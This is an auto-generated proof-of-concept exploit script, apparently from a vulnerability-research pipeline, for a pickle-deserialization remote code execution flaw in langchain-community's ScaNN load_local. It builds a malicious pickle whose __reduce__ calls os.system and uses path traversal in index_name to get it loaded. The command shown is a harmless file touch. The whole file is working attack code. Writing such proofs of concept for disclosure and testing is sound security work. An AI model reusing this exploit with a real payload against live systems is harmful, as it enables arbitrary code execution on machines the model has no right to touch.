#!/usr/bin/env python3
# PoC for langchain-community-only (/tmp/langchain-community-only)
# Path: rce-013
# Sink: load_local
# Auto-generated — run with: python3 rce_function_load_local_uses_load_local_15.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept exploit for langchain-community-only RCE via pickle deserialization.

Vulnerability: The load_local function in ScaNN vectorstore uses pickle.load on a file
path constructed from user-controlled folder_path and index_name. When the developer
sets allow_dangerous_deserialization=True, an attacker can use path traversal in
index_name to load an arbitrary pickle file from the filesystem, leading to RCE.

This PoC demonstrates the vulnerability by:
1. Creating a malicious pickle file that executes a benign command (touch /tmp/poc_success.txt)
2. Using path traversal in index_name to load that malicious pickle file
3. Verifying the command was executed

Usage:
    python poc.py [--target /path/to/target/directory]
"""

import os
import sys
import pickle
import subprocess
import tempfile
import argparse
from pathlib import Path

# Import the vulnerable function
from langchain_community.vectorstores.scann import ScaNN


def create_malicious_pickle(output_path: str) -> None:
    """
    Create a malicious pickle file that executes a benign command.
    
    The pickle will execute: touch /tmp/poc_success.txt
    This is a safe, non-destructive command that proves RCE.
    """
    class MaliciousPickle:
        def __reduce__(self):
            # Return a tuple (callable, args) that pickle will execute
            return (os.system, ("touch /tmp/poc_success.txt",))
    
    malicious_obj = MaliciousPickle()
    
    with open(output_path, "wb") as f:
        pickle.dump(malicious_obj, f)
    
    print(f"[+] Created malicious pickle file at: {output_path}")


def verify_exploit_success() -> bool:
    """
    Check if the benign command was executed successfully.
    Returns True if /tmp/poc_success.txt exists.
    """
    return os.path.exists("/tmp/poc_success.txt")


def main():
    parser = argparse.ArgumentParser(
        description="PoC for langchain-community ScaNN pickle deserialization RCE"
    )
    parser.add_argument(
        "--target",
        default="/tmp/exploit_target",
        help="Target directory to write malicious pickle and trigger load_local"
    )
    args = parser.parse_args()
    
    target_dir = args.target
    
    # Step 1: Create a temporary directory for our malicious pickle
    with tempfile.TemporaryDirectory() as temp_dir:
        malicious_pickle_path = os.path.join(temp_dir, "malicious.pkl")
        
        # Step 2: Create the malicious pickle file
        print("[*] Step 1: Creating malicious pickle file...")
        create_malicious_pickle(malicious_pickle_path)
        
        # Step 3: Set up the target directory structure
        # The vulnerable code does: path / "{index_name}.pkl"
        # We'll use path traversal to point to our malicious pickle
        print(f"[*] Step 2: Setting up target directory at {target_dir}...")
        Path(target_dir).mkdir(parents=True, exist_ok=True)
        
        # Also need to create the .scann directory that load_local expects
        # (it does mkdir on the scann path before loading pickle)
        scann_dir = os.path.join(target_dir, "dummy.scann")
        Path(scann_dir).mkdir(parents=True, exist_ok=True)
        
        # Step 4: Craft the path traversal payload
        # The vulnerable code constructs: path / "{index_name}.pkl"
        # If index_name = "../../path/to/malicious" (without .pkl extension)
        # It becomes: target_dir / "../../path/to/malicious.pkl"
        # Which resolves to: /path/to/malicious.pkl
        
        # Calculate relative path from target_dir to our malicious pickle
        rel_path = os.path.relpath(malicious_pickle_path, target_dir)
        # Remove the .pkl extension since the code adds it back
        if rel_path.endswith(".pkl"):
            index_name = rel_path[:-4]
        else:
            index_name = rel_path
        
        print(f"[*] Step 3: Using path traversal with index_name='{index_name}'")
        print(f"    This will resolve to: {os.path.join(target_dir, index_name + '.pkl')}")
        
        # Step 5: Trigger the vulnerability
        print("[*] Step 4: Triggering load_local with allow_dangerous_deserialization=True...")
        try:
            # We need to provide a valid embedding object, but the exploit happens
            # before the embedding is used (during pickle.load)
            # We'll use a dummy embedding that won't be called
            from langchain_core.embeddings import Embeddings
            
            class DummyEmbeddings(Embeddings):
                def embed_documents(self, texts):
                    return [[0.0] * 128 for _ in texts]
                
                def embed_query(self, text):
                    return [0.0] * 128
            
            dummy_embedding = DummyEmbeddings()
            
            # This call will trigger pickle.load with our malicious file
            result = ScaNN.load_local(
                folder_path=target_dir,
                embedding=dummy_embedding,
                index_name=index_name,
                allow_dangerous_deserialization=True
            )
            
            print("[!] load_local completed (may have raised an error after RCE)")
            
        except Exception as e:
            # The exploit may cause an error after the pickle is loaded
            # (e.g., if the loaded data doesn't match expected format)
            # But the RCE should have already occurred
            print(f"[!] Exception after triggering load_local: {e}")
            print("[*] This is expected - the RCE happens before the error")
        
        # Step 6: Verify the exploit
        print("[*] Step 5: Verifying exploit success...")
        if verify_exploit_success():
            print("[+] SUCCESS: /tmp/poc_success.txt exists - RCE achieved!")
            print("[*] The malicious pickle executed: touch /tmp/poc_success.txt")
            
            # Clean up the evidence
            os.remove("/tmp/poc_success.txt")
            print("[*] Cleaned up /tmp/poc_success.txt")
        else:
            print("[-] Exploit may have failed - /tmp/poc_success.txt not found")
            print("[*] Check that the target directory exists and is writable")
            sys.exit(1)


if __name__ == "__main__":
    main()
